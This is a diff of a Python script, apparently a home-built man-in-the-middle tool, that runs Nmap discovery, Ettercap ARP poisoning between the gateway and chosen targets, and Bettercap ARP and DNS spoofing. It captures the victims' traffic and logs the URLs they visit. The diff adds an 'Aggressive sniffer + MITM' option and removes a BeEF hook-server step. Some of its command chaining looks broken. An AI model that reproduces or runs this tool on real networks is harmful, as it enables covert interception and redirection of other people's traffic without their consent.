@@ -1,3 +1,4 @@
+import sys
 import asyncio
 import os
 import re
@@ -11,13 +12,14 @@ import signal
 import pyfiglet
 from termcolor import colored
 import random
-import socket
+import time
 from scapy.all import rdpcap, IP
 from collections import defaultdict
 import socket as std_socket
 import webbrowser
 from scapy.all import rdpcap
 import dns.resolver
+from colorama import Fore, Style
 from dns.exception import DNSException
 
 def create_ascii_text():
@@ -32,7 +34,6 @@ def create_ascii_text():
 
     # Clear the terminal screen
     os.system("clear")
-
     # Choose a random font and color
     font_choice = random.choice(font_list)
     color_choice = random.choice(color_list)
@@ -47,6 +48,36 @@ def create_ascii_text():
     print(copy_right)
 # call function
 create_ascii_text()
+
+
+
+async def get_user_input():
+    # Assuming the user data is gathered here, and we will return it as a dictionary
+    user_data = {}
+
+    # Collect the active network interface
+    user_data['interface'] = input("Enter your active interface e.g. wlan0: ").strip()
+
+    # The path to the URL file and the filter file
+    user_data['url_file_path'] = 'url_file.txt'
+    user_data['filter_file'] = 'excluded_ips.ef'
+
+    # List of IPs to exclude
+    user_data['exclude_ips'] = ["192.168.1.1", "192.168.1.2", "192.168.1.5", "192.168.1.125", "192.168.1.253"]
+
+    # Collect the target IP(s) for scanning, convert input string to a list
+    target_ips_input = input("Enter the target IPs (comma separated): ").strip()
+
+    # If input is not empty, split by comma and remove spaces to create the list
+    if target_ips_input:
+        user_data['target_ips'] = [ip.strip() for ip in target_ips_input.split(',')]
+    else:
+        # Default target IP if no input is provided
+        user_data['target_ips'] = ["192.168.1.1"]
+
+    return user_data
+
+
 
 # Get default gateway and IP address for the given interface
 async def get_network_info(interface):
@@ -98,17 +129,18 @@ async def run_nmap_scan(target):
         print(Fore.RED + f"An error occurred: {e}")
         return []
 
-import os
-import asyncio
-from colorama import Fore
 
-async def compile_filter_file(filter_file):
+
+async def compile_filter_file(filter_file, interface):
     if not os.path.isfile(filter_file):
         print(Fore.RED + f"Error: The input file '{filter_file}' does not exist.")
         return None
 
     compiled_file = filter_file.replace('.ef', '.efc')
     compile_command = ['sudo', 'etterfilter', filter_file, '-o', compiled_file]
+
+    # Optional: Log the interface if you want to use it for debugging or tracking
+    print(f"Compiling filter file using interface: {interface}")
 
     try:
         print(f"Compiling filter file with command: {' '.join(compile_command)}")
@@ -133,9 +165,12 @@ async def compile_filter_file(filter_file):
         print(Fore.RED + f"An error occurred while compiling the filter file: {e}")
         return None
 
+
+
+
 async def run_ettercap(interface, default_gateway, target_ips, filter_file, url_file_path):
     # Compile the filter file and ensure it's compiled correctly
-    compiled_file = await compile_filter_file(filter_file)
+    compiled_file = await compile_filter_file(filter_file, interface)  # Pass interface to the compile step
     if not compiled_file:
         print(Fore.RED + "Failed to compile the filter file. Aborting Ettercap run.")
         return
@@ -162,7 +197,13 @@ async def run_ettercap(interface, default_gateway, target_ips, filter_file, url_
         try:
             # Run the Ettercap command
             print(f"Running Ettercap with command: {' '.join(ettercap_command)}")
-            print('Wait the packets to appear in wireshark...')
+            print('Wait for packets to appear in Wireshark...')
+            print('Attacking ...')
+
+            # Running Ettercap in a new GNOME terminal window
+            gnome_ettercap_command = f'gnome-terminal -- bash -c "sudo ettercap -T -S -i {interface} -F {compiled_file} -M arp:remote //{default_gateway}/ //{target_ip}/ -w {pcap_file}; exec bash"'
+            os.system(gnome_ettercap_command)  # Launch Ettercap in GNOME terminal
+
             ettercap_process = await asyncio.create_subprocess_exec(
                 *ettercap_command,
                 stdout=asyncio.subprocess.PIPE,
@@ -188,15 +229,21 @@ async def run_ettercap(interface, default_gateway, target_ips, filter_file, url_
                             f.write(f"{matched_url} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                     print(Fore.GREEN + f"Matched URLs for {target_ip} have been logged to {target_ip}.txt")
 
+            # Open Wireshark in a new GNOME terminal window with filter applied
+            gnome_wireshark_command = f'gnome-terminal -- bash -c "wireshark -i {interface} -k -Y \\"ip.addr=={target_ip}\\"; exec bash"'
+            os.system(gnome_wireshark_command)  # Launch Wireshark in GNOME terminal
+
         except asyncio.CancelledError:
             # Handle process cancellation
             print(Fore.YELLOW + f"Ettercap process was cancelled for target: {target_ip}")
             ettercap_process.terminate()
             await ettercap_process.wait()
+            await menu()  # Display the menu again after cancellation
 
         except Exception as e:
             # Handle any unexpected errors
             print(Fore.RED + f"An error occurred while running Ettercap for target {target_ip}: {e}")
+            await menu()  # Display the menu again after an error
 
 
 async def extract_urls_from_pcap(pcap_file):
@@ -261,21 +308,6 @@ def read_urls_from_file(file_path):
     
     return urls
 
-async def apply_filter_and_save(pcap_file, output_file, filter_str):
-    command = [
-        'tshark',  # Use tshark for filtering
-        '-r', pcap_file,      # Input pcap file
-        '-Y', filter_str,     # Display filter
-        '-w', output_file     # Output pcap file to save filtered results
-    ]
-    
-    try:
-        # Run the tshark command
-        process = await asyncio.create_subprocess_exec(*command)
-        await process.wait()  # Wait for the process to complete
-        print(Fore.GREEN + f"Filtered pcap file saved as {output_file}.")
-    except Exception as e:
-        print(Fore.RED + f"An error occurred while filtering the pcap file: {e}")
 
 def create_excluded_ips_file(filter_file, exclude_ips):
     try:
@@ -293,6 +325,8 @@ def handle_sigterm(signum, frame):
     print(Fore.YELLOW + "Received termination signal. Cleaning up...")
     # Implement any necessary cleanup here
     exit(0)
+
+
 
 async def run_wireshark(interface, target_ips, urls, exclude_ips):
     # Ensure target_ips is a list
@@ -313,14 +347,15 @@ async def run_wireshark(interface, target_ips, urls, exclude_ips):
     url_filters = " || ".join([f'frame contains "{url}"' for url in normalized_urls if url])
 
     # Combine IP filters and URL filters
-    if exclude_filter and target_ip_filter and url_filters:
-        filter_str = f"({exclude_filter}) && ({target_ip_filter}) && ({url_filters})"
-    elif exclude_filter and target_ip_filter:
-        filter_str = f"({exclude_filter}) && ({target_ip_filter})"
-    elif target_ip_filter and url_filters:
-        filter_str = f"({target_ip_filter}) && ({url_filters})"
-    else:
-        filter_str = f"{target_ip_filter} || {url_filters}"
+    filter_parts = []
+    if exclude_filter:
+        filter_parts.append(f"({exclude_filter})")
+    if target_ip_filter:
+        filter_parts.append(f"({target_ip_filter})")
+    if url_filters:
+        filter_parts.append(f"({url_filters})")
+
+    filter_str = " && ".join(filter_parts) if filter_parts else "ip"
 
     # Print the combined filter for debugging
     print(Fore.CYAN + f"Running Wireshark with combined filter: {filter_str}")
@@ -342,15 +377,13 @@ async def run_wireshark(interface, target_ips, urls, exclude_ips):
             print(Fore.RED + f"Wireshark encountered an error: {stderr.decode().strip()}")
         else:
             print(Fore.GREEN + "Wireshark completed.")
-        
-        # Simulate URL match detection
-        for url in normalized_urls:
-            match_found = True  # Replace with actual matching logic (e.g., from Wireshark output)
-            if match_found:
-                print(Fore.GREEN + f"Host matched with URL: {url}")
+            await menu()
+                
         
     except Exception as e:
         print(Fore.RED + f"An error occurred while running Wireshark: {e}")
+
+
 
 
 #resolve
@@ -526,48 +559,89 @@ def open_web_browser():
 
 async def run_bettercap():
     iptospoof = input("Enter IP to spoof (e.g., 192.168.0.121): ")
-    domaintoforward = input("Enter domain to forward (e.g., myexample.com): ")
+    domaintoforward = "unused.com"
+
+    # Prepare the Bettercap commands with delays
+    commands = [
+        "net.probe on",
+        "net.show",
+        "set arp.spoof.targets {}".format(iptospoof),
+        "net.sniff on",
+        "net.sniff off",
+        "clear",
+        "set dns.spoof.domains {}".format(domaintoforward),
+        "dns.spoof on"
+    ]
     
-    # Prepare the Bettercap commands
-    commands = f"""
-    net.probe on
-    net.show
-    set arp.spoof.targets {iptospoof}
-    net.sniff on
-    net.sniff off
-    clear
-    set dns.spoof.domains {domaintoforward}
-    dns.spoof on
-    """
+    # Open GNOME Terminal and run Bettercap commands
+    terminal_command = [
+        'gnome-terminal', 
+        '--', 
+        'bash', '-c', 
+        f"echo 'Starting Bettercap...'; sudo bettercap -X -I wlan0; "  # Replace 'wlan0' with your interface
+        f"{' && '.join(commands)}; exec bash"
+    ]
     
-    # Use subprocess to pipe commands into Bettercap
-    process = subprocess.Popen(['sudo', 'bettercap'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-    stdout, stderr = process.communicate(input=commands)
+    try:
+        # Run the terminal command
+        process = subprocess.Popen(terminal_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        # Optionally, read and print the terminal's stdout and stderr
+        stdout, stderr = process.communicate()
 
-    if stderr:
-        print(f"Bettercap error: {stderr}")
-    if stdout:
-        print(f"Bettercap output: {stdout}")
+        if process.returncode != 0:
+            print(f"Error in running Bettercap: {stderr.decode()}")
+        else:
+            print("Bettercap running successfully in GNOME Terminal.")
+    
+    except Exception as e:
+        print(f"Error running Bettercap in GNOME Terminal: {e}")
 
-async def filter_and_analyze_pcap():
-    # Set up signal handler
-    signal.signal(signal.SIGTERM, handle_sigterm)
 
-    # Change the following if needed: interface, url_file_path which includes top common URLs.
-    interface=input("enter your active interface e.g. wlan0: ").strip() # change the wireless interface based on your active interface.
-    url_file_path = 'url_file.txt'
-    filter_file = 'excluded_ips.ef'
-    exclude_ips = ["192.168.1.1", "192.168.1.2", "192.168.1.5", "192.168.1.125", "192.168.1.253"]  # Add or remove based IPs for exclusion.
-    target_ips = ["192.168.1.1"]  # Replace with actual target IP to sniff (add more target IPs manually if needed)
+
+
+async def apply_filter_and_save(pcap_file, output_file, filter_str):
+    command = [
+        'tshark',  # Use tshark for filtering
+        '-r', pcap_file,      # Input pcap file
+        '-Y', filter_str,     # Display filter
+        '-w', output_file     # Output pcap file to save filtered results
+    ]
+    
+    try:
+        # Run the tshark command
+        process = await asyncio.create_subprocess_exec(*command)
+        await process.wait()  # Wait for the process to complete
+        print(Fore.GREEN + f"Filtered pcap file saved as {output_file}.")
+    except Exception as e:
+        print(Fore.RED + f"An error occurred while filtering the pcap file: {e}")
+async def filter_and_analyze_pcap(user_data):
+    # Set up signal handler for termination
+    loop = asyncio.get_event_loop()
+    loop.add_signal_handler(signal.SIGTERM, handle_sigterm)
+
+    # Extract user data from the parameter
+    interface = user_data['interface']
+    url_file_path = user_data['url_file_path']
+    filter_file = user_data['filter_file']
+    exclude_ips = user_data['exclude_ips']
+    target_ips = user_data['target_ips']
 
     try:
+        # Assume this function gets network information (gateway and IP address)
         default_gateway, ip_address = await get_network_info(interface)
     except Exception as e:
         print(Fore.RED + f"Error getting network info: {e}")
         return
 
-    target_network = f"{default_gateway}/24"  # Change the subnet mask based on your network
-    isactive = await run_nmap_scan(target_network)
+    target_network = f"{default_gateway}/24"
+    
+    try:
+        # Run nmap scan to identify active devices
+        isactive = await run_nmap_scan(target_network)
+    except Exception as e:
+        print(Fore.RED + f"Error running Nmap scan: {e}")
+        return
 
     print(f"Excluded IPs: {exclude_ips}")
     reinclude_choice = input("Enter the IP you want to reinclude (choose from the list above) or press Enter to skip: ")
@@ -581,7 +655,7 @@ async def filter_and_analyze_pcap():
     
     if target_ips[0] not in isactive:
         print(f"{target_ips[0]} is not active after the Nmap scan")
-
+        
         if input("Do you want to add another device to the target_ips list? (yes/no or press Enter to skip): ").lower() == "yes":
             to_scan = input("Enter the host IP to add to the scan: ")
             if input(f"Do you want to remove all the old targets {target_ips} from the target_ips list? (remove/keep or press Enter to skip): ").lower() == "remove":
@@ -592,6 +666,7 @@ async def filter_and_analyze_pcap():
                 target_ips.append(to_scan)
                 print(f"Added new target, keeping existing targets: {target_ips}")
 
+    # Prepare filenames for pcap files
     pcap_file = f'{"_".join(target_ips)}_filtered_activity.pcap'
     output_file = f'{"_".join(target_ips)}_filtered_output.pcap'
 
@@ -599,7 +674,7 @@ async def filter_and_analyze_pcap():
     create_excluded_ips_file(filter_file, exclude_ips)
 
     # Compile the filter file
-    compiled_file = await compile_filter_file(filter_file)
+    compiled_file = await compile_filter_file(filter_file, interface)
     if not compiled_file:
         print(Fore.RED + "Compilation failed.")
         return
@@ -621,7 +696,11 @@ async def filter_and_analyze_pcap():
 
     print(Fore.CYAN + f"Applying filter to pcap file: {filter_str}")
 
-    # Start Ettercap and Wireshark in parallel
+    # Initialize tasks as None to ensure they are defined even if exceptions are raised
+    ettercap_task = None
+    wireshark_task = None
+
+    # Run Ettercap and Wireshark in parallel
     try:
         ettercap_task = asyncio.create_task(run_ettercap(interface, default_gateway, target_ips, filter_file, url_file_path))
         wireshark_task = asyncio.create_task(run_wireshark(
@@ -630,9 +709,6 @@ async def filter_and_analyze_pcap():
             urls=url_file_path,
             exclude_ips=exclude_ips
         ))
-        
-        # Delay to ensure Ettercap starts capturing
-        await asyncio.sleep(5)
 
         # Wait for both Ettercap and Wireshark to finish
         await asyncio.gather(ettercap_task, wireshark_task)
@@ -640,12 +716,12 @@ async def filter_and_analyze_pcap():
     except Exception as e:
         print(Fore.RED + f"An error occurred while running Ettercap and Wireshark: {e}")
         # Cancel tasks if any exception occurs
-        if 'ettercap_task' in locals() and not ettercap_task.done():
+        if ettercap_task and not ettercap_task.done():
             ettercap_task.cancel()
-        if 'wireshark_task' in locals() and not wireshark_task.done():
+        if wireshark_task and not wireshark_task.done():
             wireshark_task.cancel()
         await asyncio.gather(
-            *(task for task in [ettercap_task, wireshark_task] if not task.done()),
+            *(task for task in [ettercap_task, wireshark_task] if task and not task.done()),
             return_exceptions=True
         )
 
@@ -658,21 +734,8 @@ async def filter_and_analyze_pcap():
 
     print(Fore.GREEN + "Both filtering and Wireshark analysis completed.")
 
-async def apply_filter_and_save(pcap_file, output_file, filter_str):
-    command = [
-        'tshark',  # Use tshark for filtering
-        '-r', pcap_file,      # Input pcap file
-        '-Y', filter_str,     # Display filter
-        '-w', output_file     # Output pcap file to save filtered results
-    ]
-    
-    try:
-        # Run the tshark command
-        process = await asyncio.create_subprocess_exec(*command)
-        await process.wait()  # Wait for the process to complete
-        print(Fore.GREEN + f"Filtered pcap file saved as {output_file}.")
-    except Exception as e:
-        print(Fore.RED + f"An error occurred while filtering the pcap file: {e}")
+
+
 
 def has_packets(pcap_file):
     """ Check if the PCAP file contains any packets. """
@@ -682,22 +745,11 @@ def has_packets(pcap_file):
     except Exception as e:
         print(Fore.RED + f"Error reading PCAP file: {e}")
         return False
+async def resolve_and_display_ips(user_data):
+    # Extract target_ips from user_data
+    target_ips = user_data.get("target_ips", ["192.168.1.121"])  # Default if not set in user_data
 
-async def resolve_and_display_ips():
-    target_ips = ["192.168.1.12"] #add/remove hosts as needed"
-    target_ip_to_add=input("enter ip to add:")
-    target_ips.clear()
-    target_ips.append(target_ip_to_add)
-    interface=input("enter your active interface e.g. wlan0: ").strip() #change the interface based on yours 
-
-    try:
-        default_gateway, ip_address = await get_network_info(interface)
-    except Exception as e:
-        print(Fore.RED + f"Error getting network info: {e}")
-        return
-
-    target_network = f"{default_gateway}/24"
-    isactive = await run_nmap_scan(target_network)
+    # Resolve pcap file names and display results
     pcap_file = f'{"_".join(target_ips)}_filtered_activity.pcap'
     output_file_path = f'{"_".join(target_ips)}_resolved_output.txt'
 
@@ -706,12 +758,14 @@ async def resolve_and_display_ips():
     for packet_summary, data in resolved_info.items():
         print(f"Packet: {packet_summary}")
         print(f"Source IP: {data['src_ip']} -> Source Hostname: {data['src_hostname']}")
-        print(f"Destination IP: {data['dst_ip']} -> Destination Hostname: {data['dst_hostname']}")
-        print()
+        print(f"Destination IP: {data['dst_ip']} -> Destination Hostname: {data['dst_hostname']}\n")
+
+    # Extract and deduplicate IPs for WHOIS lookup
+    ip_addresses = await get_ip_addresses_from_pcap(pcap_file)
+    unique_ips = list(set(ip_addresses))  # Remove duplicates
 
     # Perform WHOIS lookups
-    ip_addresses = await get_ip_addresses_from_pcap(pcap_file)
-    whois_tasks = [whois_lookup(ip) for ip in ip_addresses]
+    whois_tasks = [whois_lookup(ip) for ip in unique_ips]
     whois_results = await asyncio.gather(*whois_tasks)
 
     # Display WHOIS results
@@ -725,55 +779,44 @@ async def resolve_and_display_ips():
             print(f"Netname: {result.get('Netname', 'N/A')}")
             print(f"NetRange: {result.get('NetRange', 'N/A')}")
             print(f"Country: {result.get('Country', 'N/A')}")
-            print(f"Abuse Contact: {result.get('Abuse Contact', 'N/A')}")
-        print()
+            print(f"Abuse Contact: {result.get('Abuse Contact', 'N/A')}\n")
+
 async def menu():
+    user_data = {}  # Store user inputs to prevent re-asking
+
     while True:
         print("\nMenu:")
-        print("1. Sniffer: Filter and Analyze Pcap")#begin executing and observe how sniffing works. this step will create a capture file the target. 
-        print("2. Resolve and Display IPs")#require executing step 1 based on ip (shows every connection which was made by the target).
-        print("3. Spoofer: Bettercap ('MITM attack')")#after executing it open wireshark and observe how spoofing a target works.
-        print("4. Exit")
+        print("1. Sniffer: Filter and Analyze Pcap")
+        print("2. Resolve and Display IPs")
+        print("3. Spoofer: Bettercap ('MITM attack')")
+        print("4. Aggressive sniffer + MITM")
+        print("5. Exit")
 
         choice = input("Enter your choice: ")
 
+        if choice in {'1', '2', '4'}:
+            # Ensure we collect user data only once
+            if not user_data:
+                user_data = await get_user_input()
+
         if choice == '1':
-            await filter_and_analyze_pcap()
+            await filter_and_analyze_pcap(user_data)  # Use stored data
         elif choice == '2':
-            await resolve_and_display_ips()
+            await resolve_and_display_ips(user_data)  # Use stored data
         elif choice == '3':
-            # Run Bettercap commands
-            await run_bettercap()
-
-            # Start Apache and BeEF
-            await start_apache()
-            await asyncio.sleep(5)  # Wait for Apache to start
-            open_web_browser()
-            await start_beef()# this step is used to host a server. if you know you know.
-
-            try:
-                # Keep the script running to allow manual stop
-                print("Press Ctrl+C to stop Apache and exit.")
-                while True:
-                    await asyncio.sleep(1)
-            except KeyboardInterrupt:
-                # Stop Apache and exit
-                await stop_apache()
-                print("Apache stopped. Exiting.")
-                break
+            await run_bettercap()  # No need for user input storage here
         elif choice == '4':
+            await asyncio.gather(
+                filter_and_analyze_pcap(user_data),
+                run_bettercap()
+            )
+        elif choice == '5':
             print("Exiting...")
-            break
+            sys.exit(0)
         else:
-            print("Invalid choice. Please enter a number between 1 and 4.")
-        
-
-        await menu()  # Show menu again if invalid choice
-
+            print("Invalid choice. Please enter a number between 1 and 5.")
 async def main():
     await menu()
 
 if __name__ == "__main__":
     asyncio.run(main())
-
-
